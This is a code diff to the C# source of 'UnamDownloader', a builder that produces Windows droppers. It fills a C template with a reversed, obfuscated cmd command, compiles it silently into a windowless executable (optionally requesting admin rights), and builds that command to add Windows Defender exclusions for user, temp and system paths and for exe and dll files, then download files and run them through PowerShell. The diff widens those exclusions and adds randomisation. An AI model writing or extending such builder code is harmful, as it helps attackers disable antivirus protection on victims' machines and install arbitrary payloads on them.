@@ -99,11 +99,15 @@ namespace UnamDownloader
             {
                 System.IO.File.WriteAllBytes(Path.Combine(currentDirectory, "manifest.o"), Properties.Resources.manifest);
             }
-            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), Properties.Resources.Program1.Replace("#COMMAND", ReverseString("cmd " + CreateCommand())));
+            StringBuilder sb = new StringBuilder(Properties.Resources.Program1);
+            sb.Replace("#COMMAND", ReverseString("cmd " + CreateCommand()));
+            sb.Replace("#RANDOM", RandomString(12));
+
+            System.IO.File.WriteAllText(Path.Combine(currentDirectory, filename), sb.ToString());
             Process.Start(new ProcessStartInfo
             {
                 FileName = Path.Combine(currentDirectory, "tinycc\\tcc.exe"),
-                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (checkAdmin.Checked ? "manifest.o" : "") + " -luser32",
+                Arguments = "-Wall -Wl,-subsystem=windows \"" + filename + "\" " + (checkAdmin.Checked ? "manifest.o" : "") + " -luser32 -m32",
                 WorkingDirectory = currentDirectory,
                 WindowStyle = ProcessWindowStyle.Hidden
             }).WaitForExit();
@@ -128,11 +132,7 @@ namespace UnamDownloader
                     executes.Add(string.Format(@"powershell Start-Process -FilePath '{0}'", Path.Combine(droplocation, filevar.txtFilename.Text)));
                 }
             }
-
-            string[] exclusions = { "powershell -Command Add-MpPreference -ExclusionPath '%UserProfile%'", "powershell -Command Add-MpPreference -ExclusionPath '%AppData%'", "powershell -Command Add-MpPreference -ExclusionPath '%Temp%'", "powershell -Command Add-MpPreference -ExclusionPath '%SystemRoot%'" };
-            string[] randomexclusions = exclusions.OrderBy(x => random.Next()).ToArray();
-
-            return ("/c " + (checkWD.Checked ? string.Join(" & ", randomexclusions) + " & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit").Replace(@"\", @"\\").Replace("\"", "\\\"");
+            return ("/c " + (checkWD.Checked ? "powershell -Command Add-MpPreference -ExclusionPath @('%UserProfile%','%AppData%','%Temp%','%SystemRoot%','%HomeDrive%','%SystemDrive%') -Force & powershell -Command Add-MpPreference -ExclusionExtension @('exe','dll') -Force & " : "") + string.Join(" & ", downloads.ToArray()) + (executes.Count > 0 ? " & " + string.Join(" & ", executes.ToArray()) : "") + " & exit").Replace(@"\", @"\\").Replace("\"", "\\\"");
         }
 
         public string RandomString(int length)
@@ -152,7 +152,7 @@ namespace UnamDownloader
             if (text == null) return null;
             char[] array = text.ToCharArray();
             Array.Reverse(array);
-            return new String(array);
+            return new string(array);
         }
 
         public string SaveDialog(string filter)
